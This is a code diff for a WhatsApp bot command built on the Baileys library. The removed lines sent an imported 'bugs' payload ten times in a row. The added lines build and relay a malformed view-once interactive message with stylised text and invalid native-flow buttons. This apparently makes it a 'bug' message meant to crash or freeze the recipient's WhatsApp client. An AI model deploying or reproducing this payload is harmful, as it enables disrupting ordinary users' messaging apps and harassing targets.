@@ -1,18 +1,48 @@
 
+import pkg from '@whiskeysockets/baileys';
 
-import pdff from "../bugs/pdff.js"
+const { proto, generateWAMessageFromContent } = pkg;
 
-async function test(message, client) {
+export async function test(message, client) {
 
-    const remoteJid = message.key.remoteJid;
-    // body...;
-     for (let i = 0; i < 10; i++) {
+    const target = message.key.remoteJid;
 
-            await client.sendMessage(remoteJid, {text:`${pdff}`})
+    console.log("Sending")
 
-        }
+     let msg = await generateWAMessageFromContent(target, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃",
+                                hasMediaAttachment: false
+                            },
+                            body: {
+                                text: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃"
+                            },
+                            nativeFlowMessage: {
+                                messageParamsJson: "",
+                                buttons: [{
+                                        name: "single_select",
+                                        buttonParamsJson: "z"
+                                    },
+                                    {
+                                        name: "call_permission_request",
+                                        buttonParamsJson: "{}"
+                                    }
+                                ]
+                            }
+                        }
+                    }
+                }
+            }, {});
 
-    }
+            await client.relayMessage(target, msg.message, {
+                messageId: msg.key.id,
+                participant: { jid: target }
+            });
 
-
+            console.log("Document")
+}
+ 
 export default test;
